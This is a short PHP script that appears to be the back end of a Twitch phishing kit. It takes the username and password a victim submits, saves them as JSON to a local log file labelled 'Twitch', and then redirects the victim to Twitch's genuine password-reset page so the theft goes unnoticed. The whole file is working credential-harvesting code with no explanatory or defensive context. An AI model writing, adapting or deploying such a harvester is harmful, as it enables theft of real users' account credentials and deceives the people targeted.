<?php

header('Location: https://passport.twitch.tv/password_resets/new?');
$data = array('site' => 'Twitch',
  'user' => $_POST['username'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>